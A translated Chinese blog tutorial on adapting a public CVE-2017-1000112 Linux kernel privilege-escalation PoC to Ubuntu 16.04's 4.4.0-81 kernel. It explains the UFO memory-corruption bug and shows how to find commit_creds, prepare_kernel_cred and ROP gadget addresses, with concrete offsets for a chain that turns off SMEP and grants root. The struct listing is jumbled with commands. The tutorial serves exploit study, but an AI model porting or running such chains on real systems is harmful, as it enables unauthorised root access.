# 如何将漏洞CVE-2017-1000112应用到其他内核上
|
##### 译文声明
本文是翻译文章，文章原作者 Rick，文章来源：blogspot.jp
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 写在前面的话
在这篇文章中，我们将跟大家介绍如何将Andrey针对CVE-2017-1000112的PoC应用到其他内核上。为了给大家演示，本文将使用Ubuntu的Xenial（16.04）内核版本4.4.0-81-generic来进行测试。
PoC代码下载：【[点我下载](https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c)】
## 漏洞时间轴
2017年08月03日：将漏洞报告给厂商；
2017年08月04日：将漏洞报告给linux-distros@；
2017年08月10日：漏洞补丁提交给netdev；
2017年08月10日：oss-security@发布官方声明；
## 描述
这个PoC利用的是Linux内核UFO到非UFO路径转换时的内存崩溃问题，在构建一个UFO数据包时，内核会使用MSG_MORE
__ip_append_data()函数来调用ip_ufo_append_data()并完成路径的添加。但是在这两个send()调用的过程中，添加的路径可以从UFO路径转换为非UFO路径，而这将导致内存崩溃的发生。为了防止UFO数据包长度超过MTU，非UFO路径的copy
= maxfraglen – skb->len将会变成false，并分配新的skb。这将会出发程序计算fraggap = skb_prev->len –
maxfraglen的值，并将copy = datalen – transhdrlen –
fraggap设置为false。需要注意的是，类似的问题IPv6的代码中同样存在。
## 漏洞修复
关于漏洞的修复情况，请参考【[这篇文章](https://git.kernel.org/pub/scm/linux/kernel/git/davem/net.git/commit/?id=85f1bd9a7b5a79d5baa8bf44af19658f7bf77bfa)】。
## 漏洞情况概述
UFO（UDP Fragmentation Offload）是将较大的UDP数据包进行分片。由于UDP 数据包不会自己进行分段，因此当长度超过了 MTU
时，会在网络层进行 IP 分片。 这将减少较大的UDP数据包分片到MTU大小的数据包中的堆栈开销。
Linux 内核存在内存崩溃漏洞，从UFO到非UFO在路径切换过程中，构建UFO数据包时使用了MSG_MORE
__ip_append_data（）调用ip_ufo_append_data（）。在两个send（）调用之间，路径从UFO切换到非UFO过程中，会导致内存崩溃。Linux
内核 UFO到非UFO 路径切换内存崩溃漏洞会造成普通用户提权到root用户。
给Ubuntu 16.04（内核Kernel 4.4.0-81-generic）添加偏移量
PoC的框架允许我们给commit_creds、prepare_kernel_cred以及不同内涵的ROP链添加地址偏移量。在对kernel_info的结构进行了分析之后，我们还可以使用目标内核地址来更新这部分数据。
## 寻找内核函数
接下来，我们需要确定commit_creds、prepare_kernel_cred以及针对CR4读写函数的地址偏移量。
## 基于Ubuntu 16.04.2创建目标虚拟机
在本文的演示过程中，我将使用VMWare。
镜像下载地址：【[点我下载](http://old-releases.ubuntu.com/releases/16.04.2/ubuntu-16.04.2-server-amd64.img)】
在开始测试之前，我们需要更新vmx配置文件来开启内核的调试stub：
    debugStub.listen.guest64 = "TRUE"
    debugStub.listen.guest64.remote = "TRUE"
## 安装4.4.0-81-generic内核
    sudo apt install linux-image-4.4.0-81-generic
内核安装完成之后，需要重启设备，然后寻找下列内核函数的地址：commit_creds、prepare_kernel_cred、native_read_cr4_safe和native_write_cr4。操作命令如下：
    sudo grep commit_creds /proc/kallsyms
    sudo grep prepare_kernel_cred /proc/kallsyms
    sudo grep native_read_cr4_safe /proc/kallsyms
    sudo grep native_write_cr4 /proc/kallsyms
## 寻找ROPgadget
在这个演示部分中，我将使用不同的虚拟机来调试上面所提到的目标设备。当新的虚拟机创建完成之后，我们可以使用extract-vmlinux【下载地址】来提取出未压缩的Linux内核版本，或者使用调试符来号下载内核。
你可以通过下列命令来使用调试符号获取内核：
    echo "deb http://ddebs.ubuntu.com $(lsb_release -cs) main restricted universe multiverse
    deb http://ddebs.ubuntu.com $(lsb_release -cs)-updates main restricted universe multiverse
    deb http://ddebs.ubuntu.com $(lsb_release -cs)-proposed main restricted universe multiverse" |
    sudo tee -a /etc/apt/sources.list.d/ddebs.list
    sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 428D7C01 C8CAB6595FDFF622
    apt install linux-image-4.4.0-81-generic-dbgsym
内核将会被安装在目录/usr/lib/debug/boot/vmlinux-4.4.0-81-generic之中。
## 在目标内核中安装并运行ROPgadget
我准备使用ropgadget【[下载地址](https://github.com/JonathanSalwan/ROPgadget)】来寻找出目标内核中的Gadget。操作命令如下所示：
    apt install python-pip python-capstone
    pip install ropgadget
    ROPgadget --binary /usr/lib/debug/boot/vmlinux-4.4.0-81-generic > ~/rg-4.4.0-81-generic
既然我们已经获取到了可能的gadget，我们则需要寻找出能够匹配PoC中ROP链的地址：
    struct kernel_info {
        const char _distro;
        const char_ version;
        uint64_t commit_creds;
        sudo grep commit_creds /proc/kallsyms
        0xffffffff810a2800 T commit_creds
        uint64_t prepare_kernel_cred;
                sudo grep prepare_kernel_cred /proc/kallsyms
        0xffffffff810a2bf0 T prepare_kernel_cred
        uint64_t xchg_eax_esp_ret;
                grep ': xchg eax, esp ; ret' rg-4.4.0-81-generic 
        0xffffffff8100008a : xchg eax, esp ; ret
        uint64_t pop_rdi_ret;
                grep ': pop rdi ; ret' rg-4.4.0-81-generic 
        0xffffffff813eb4ad : pop rdi ; ret
        uint64_t mov_dword_ptr_rdi_eax_ret;
                grep ': mov dword ptr [rdi], eax ; ret' rg-4.4.0-81-generic 
        0xffffffff81112697 : mov dword ptr [rdi], eax ; ret
        uint64_t mov_rax_cr4_ret;
                sudo grep cr4 /proc/kallsyms
        0xffffffff8101b9c0 t native_read_cr4_safe
        uint64_t neg_rax_ret;
                grep ': neg rax ; ret' rg-4.4.0-81-generic 
        0xffffffff8140341a : neg rax ; ret
        uint64_t pop_rcx_ret;
                grep ': pop rcx ; ret' rg-4.4.0-81-generic 
        0xffffffff8101de6c : pop rcx ; ret
        uint64_t or_rax_rcx_ret;
                grep ': or rax, rcx ; ret' rg-4.4.0-81-generic 
        0xffffffff8107a453 : or rax, rcx ; ret                  
        uint64_t xchg_eax_edi_ret;
                grep ': xchg eax, edi ; ret' rg-4.4.0-81-generic 
        0xffffffff81125787 : xchg eax, edi ; ret
        uint64_t mov_cr4_rdi_ret;
                sudo grep cr4 /proc/kallsyms
        0xffffffff81064580 t native_write_cr4
        uint64_t jmp_rcx;
                grep ': jmp rcx' rg-4.4.0-81-generic 
        0xffffffff81049ed0`
## KASLR
内核4.4.0-81并没有启用KASLR，但为了对现有文件进行确认，我们需要使用偏移量。
我们可以使用下列命令找出内核的基地址：
    sudo grep text /proc/kallsyms
    ffffffff81000000 T _text
比如说，下面的方法可以确认commit_creds的偏移量：
    0xffffffff810a2800 - 0xffffffff81000000 = 0xa2800
请注意：如果你使用的内核不支持KASLR，请使用下列命令【[参考文章](https://unix.stackexchange.com/questions/397939/turning-off-kaslr-to-debug-linux-kernel-using-qemu-and-gdb)】：
    $ grep GRUB_CMDLINE_LINUX_DEFAULT /etc/default/grub
    GRUB_CMDLINE_LINUX_DEFAULT="quiet"
    $ sudo perl -i -pe 'm/quiet/ and s//quiet nokaslr/' /etc/default/grub
    $ grep quiet /etc/default/grub
    GRUB_CMDLINE_LINUX_DEFAULT="quiet nokaslr"
    $ sudo update-grub
## 更新原始的PoC文件
我们需要使用新得到的地址来更新PoC，然后添加对Ubuntu 16.04的4.4.0内核（xenial）的支持。